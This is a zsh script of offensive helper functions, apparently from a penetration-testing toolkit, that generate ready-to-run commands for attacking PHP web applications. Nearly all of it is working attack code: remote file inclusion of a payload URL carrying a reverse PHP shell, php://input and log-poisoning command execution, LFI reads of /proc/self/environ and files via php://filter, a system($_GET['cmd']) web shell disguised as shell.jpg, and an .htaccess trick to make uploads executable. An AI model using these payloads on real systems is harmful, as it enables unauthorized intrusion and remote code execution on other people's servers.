#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-php
#############################################################

qq-enum-web-php-ffuf-raft() {
    local u && read "u?URL: "
    local d=$(echo "${u}" | cut -d/ -f3)
    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w ${__WORDS_RAFT_FILES} -u ${u}/FUZZ -e ${__EXT_PHP}"
}

qq-enum-web-php-ffuf-common-php() {
    local u && read "u?URL: "
    local d=$(echo "${u}" | cut -d/ -f3)
    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w ${__WORDS_PHP_COMMON} -u ${u}/FUZZ"
}

qq-enum-web-php-ffuf-php-fuzz() {
    local u && read "u?URL: "
    local d=$(echo "${u}" | cut -d/ -f3)
    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w ${__WORDS_PHP_FUZZ} -u ${u}FUZZ "
}

qq-enum-web-php-rfi() {
    __warn "TARGET URL should contain /page.php?rfi="
    __warn "PAYLOAD URL should contain reverse php shell"
    local u && read "u?TARGET URL: "
    local p && read "p?PAYLOAD URL: "
    print -z "curl -k -v -XGET \"${u}${p}%00\" "
}

qq-enum-web-php-rfi-php-input() {
    __warn "TARGET URL should contain /page.php?rfi="
    local u && read "u?TARGET URL: "
    print -z "curl -k -v -XPOST --data \"<?php echo shell_exec('whoami'); ?>\"  \"${u}php://input%00\" "
}

qq-enum-web-php-lfi-proc-self-environ() {
    __warn "TARGET URL should contain /page.php?lfi="
    local u && read "u?TARGET URL: "
    print -z "curl -k -v -A '<?=phpinfo(); ?>' ${u}../../../proc/self/environ "
}

qq-enum-web-php-lfi-filter-resource(){
    __warn "TARGET URL should contain /page.php?lfi="
    local u && read "u?TARGET URL: "
    local f && read "f?RFILE: "
    print -z "curl -k -v -XGET ${u}php://filter/convert.base64-encode/resource=${f} "
}

qq-enum-web-php-lfi-zip-jpg-shell() {
    __warn "TARGET URL should contain /page.php?lfi="
    local u && read "u?TARGET URL: "

    echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
    zip payload.zip payload.php
    mv payload.zip shell.jpg

    __info "Created shell.jpg"
    __warn "First upload shell.jpg to target"
    
    print -z "curl -k -v -XGET ${u}zip://shell.jpg%23payload.php?cmd="
}

qq-enum-web-php-lfi-logfile() {
    __warn "TARGET URL should contain /page.php?lfi="
    local u && read "u?TARGET URL: "
    local b && read "b?BASE URL: "
    curl -s "${b}/<?php passthru(\$_GET['cmd']); ?>"
    __info "lfi request completed"
    print -z "curl -k -v ${u}../../../../../var/log/apache2/access.log&cmd=whoami"
}

qq-enum-web-php-gen-htaccess() {
  local e && read "e?Extension: "
  __info "Upload .htaccess file to make alt extension executable by PHP"
  print -z "echo \"AddType application/x-httpd-php <extension>\" > htaccess"
}

qq-enum-web-php-phpinfo() {
  print -z "echo \"<html><body><p>PHP INFO PAGE</p><br /><?php phpinfo(); ?></body></html>\" > phpinfo.php"
}